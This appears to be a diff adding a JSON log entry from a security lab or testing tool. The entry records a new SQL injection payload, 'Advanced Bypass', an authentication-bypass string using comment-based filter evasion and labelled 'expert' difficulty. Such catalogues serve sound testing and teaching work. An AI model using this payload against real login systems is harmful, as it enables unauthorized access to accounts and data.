@@ -1,0 +1,12 @@
+{
+  "timestamp": "2026-02-13T13:47:56.900324",
+  "action": "updated_sql_injection",
+  "vulnerability_id": "sql_injection",
+  "before_payload_count": 4,
+  "after_payload_count": 5,
+  "new_payload": {
+    "name": "Advanced Bypass",
+    "payload": "admin'/**/OR/**/'1'='1'/**/--",
+    "difficulty": "expert"
+  }
+}
